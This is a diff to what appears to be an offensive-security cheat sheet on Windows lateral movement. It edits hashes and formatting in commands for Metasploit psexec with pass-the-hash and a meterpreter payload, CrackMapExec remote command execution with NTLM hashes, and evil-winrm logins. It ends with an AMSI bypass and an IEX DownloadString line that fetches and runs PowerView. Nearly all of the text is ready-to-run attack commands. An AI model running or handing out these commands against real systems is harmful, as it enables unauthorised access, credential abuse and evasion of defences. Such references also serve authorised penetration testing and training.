@@ -105,7 +105,7 @@ use exploit/windows/smb/psexec
 set RHOST 10.2.0.3
 set SMBUser username
 set SMBPass password
-set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 set PAYLOAD windows/meterpreter/bind_tcp
 run
 shell
@@ -115,25 +115,26 @@ shell
 
 ```powershell
 root@payload$ git clone https://github.com/byt3bl33d3r/CrackMapExec.github
-root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -x 'whoami' # cmd
-root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -X 'whoami' # powershell
-root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method atexec -x 'whoami'
-root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method wmiexec -x 'whoami'
-root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -x 'whoami'
+root@payload$ cme smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" -x 'whoami' # cmd
+root@payload$ cme smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" -X 'whoami' # powershell
+root@payload$ cme smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" --exec-method atexec -x 'whoami'
+root@payload$ cme smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" --exec-method wmiexec -x 'whoami'
+root@payload$ cme smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" --exec-method smbexec -x 'whoami'
 ```
 
 ## WinRM
 
-Require:
+**Requirements**:
 * Port **5985** or **5986** open.
 * Default endpoint is **/wsman**
 
+If WinRM is disabled on the system you can enable it using: `winrm quickconfig`
+
 ```powershell
-root@payload$ git clone https://github.com/Hackplayers/evil-winrm
-root@payload$ evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
-root@payload$ ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
-root@payload$ ruby evil-winrm.rb -i 10.0.0.20 -u username -H BD1C6503987F8FF006296118F359FA79
-root@payload$ ruby evil-winrm.rb -i 10.0.0.20 -u username -p password -r domain.local
+git clone https://github.com/Hackplayers/evil-winrm
+evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
+evil-winrm -i 10.0.0.20 -u username -H HASH
+evil-winrm -i 10.0.0.20 -u username -p password -r domain.local
 
 *Evil-WinRM* PS > Bypass-4MSI
 *Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
